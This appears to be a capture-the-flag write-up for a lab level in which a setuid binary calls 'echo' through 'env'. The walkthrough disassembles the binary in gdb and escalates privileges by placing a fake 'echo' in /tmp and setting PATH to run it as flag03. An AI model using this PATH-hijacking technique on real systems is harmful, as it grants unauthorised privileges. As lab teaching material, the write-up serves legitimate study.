When we log on as `level03`, we are in `/home/user/level03`. It contains a binary `-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03`
- it is owned by the user `flag03` and the `level03` group
- we don't have permission to modify it
- we don't have write permission in the folder, only in `/tmp`

If we launch the binary, it just prints "Exploit me"

We run it with gdb and dissasemble main:
```
gdb level03
break main
run
disas

output :
Dump of assembler code for function main:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     and    esp,0xfffffff0
   0x080484aa <+6>:     sub    esp,0x20
=> 0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:    mov    DWORD PTR [esp+0x18],eax
   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:    mov    DWORD PTR [esp+0x1c],eax
   0x080484bf <+27>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484c3 <+31>:    mov    DWORD PTR [esp+0x8],eax
   0x080484c7 <+35>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484cb <+39>:    mov    DWORD PTR [esp+0x4],eax
   0x080484cf <+43>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484d3 <+47>:    mov    DWORD PTR [esp],eax
   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484df <+59>:    mov    DWORD PTR [esp+0x8],eax
   0x080484e3 <+63>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484e7 <+67>:    mov    DWORD PTR [esp+0x4],eax
   0x080484eb <+71>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484ef <+75>:    mov    DWORD PTR [esp],eax
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:    mov    DWORD PTR [esp],0x80485e0
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave  
   0x08048504 <+96>:    ret 
```

We can translate this asm as the following C code
```C
#include <unistd.h>
#include <sys/types.h>

int main()
{
	gid_t gid = getgid(); #the process gets the effective group id -> level03
	uid_t eudid =  geteuid(); #the process gets its own UID ->flag03
	setresgid(?); #change the guid
	setresuid(?); #change the uid 
	system(char *cmd); #call a system cmd
	
}
```
We can see the binary gets the group id and its uid then set them in the process. It then call a system command.

We use hexdump to search for for a string looking like a command call  in the binary or use the 'strings' command. We find `"/usr/bin/env echo Exploit Me"`  
It calls `echo` with the environnment variable set in the process.
We can create a binary called `echo` and change the [`PATH`](https://en.wikipedia.org/wiki/PATH_(variable)) variable of the process.
It will run it with the permissions of `flag03` so we can ask it to call `/bin/getflag` (we know the location of the binary, thanks to `whereis getflag`).

We can `scp` the file echo.c in `/tmp`. Then we compile it (`gcc echo.c -p echo`). Finally, we override the value of `PATH` so `echo` will launch our binary and not `/bin/echo` (`export PATH=/tmp`). Launching `level03` gets us the flag :)

